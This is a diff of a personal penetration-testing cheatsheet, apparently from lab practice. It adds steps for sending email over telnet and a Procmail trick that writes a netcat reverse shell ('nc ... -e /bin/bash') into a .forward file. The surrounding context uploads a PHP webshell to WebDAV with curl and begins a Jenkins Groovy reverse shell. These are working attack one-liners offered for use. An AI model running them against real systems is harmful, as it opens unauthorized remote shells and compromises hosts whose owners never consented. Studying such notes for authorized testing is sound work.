@@ -1,5 +1,5 @@
 # My Notes / Cheatsheet
-### Last Updated: 03 Sep 2021
+### Last Updated: 05 Sep 2021
 Notes related to Vuln Assmnt/PenTesting 
 
 #### Approach for Compromising a box
@@ -224,6 +224,20 @@ xmlns:urn=\"urn:muddy\"><soapenv:Header/>
 > 1. Webdav password location probably ```bash var/www/html/webdav/passwd.dav```
 > 1. Uploading PHP rce on WebDav via CURL ```curl -X PUT -u administrantor:password http://abc.com/webdav/myrce.php --data-binary @"/usr/share/webshells/php/codeexec.php"``` 
 	
+#### Sending email via TELNET
+> 1. ```bash telnet  192.168.227.157 25```
+> 1. ```bash helo skinny```
+> 1. ```bash mail from:<fox@localhost>```
+> 1. ```bash rcpt to:<fox@localhost>```
+> 1. ```data``` (send email and hit fullstop (.) to complete message body)
+> 1. If everything is correct, the email should send. 
+	
+#### Procmail
+> 1. Procmail is used to process / forward emails.
+> 1. If .forward is present, inject your malicious reverse shell in it
+> 1. ```bash echo "|nc 192.168.118.11 9001 -e /bin/bash" > .forward```
+> 1. Send an email and you should catch the reverse shell
+	
 #### Scripts & Utilities
 > 1. Extract IP addresses out a file - ```bash sed '/\n/!s/[0-9.]\+/\n&\n/;/^\([0-9]\{1,3\}\.\)\{3\}[0-9]\{1,3\}\n/P;D' {file name}```
 
@@ -253,7 +267,7 @@ xmlns:urn=\"urn:muddy\"><soapenv:Header/>
 >1. First check what docker containers are running by runnig ```docker ps```. 
 >1. To go inside a container, run ```bash docker exec -it -u 0 <container id> /bin/sh``` or ```bash docker exec -it -u 0 <container id> /bin/bash```
 
-### Jenkis reverse shell - Linux
+### Jenkins reverse shell - Linux
 ```bash
 String host="<IP>";
 int port=<port>;
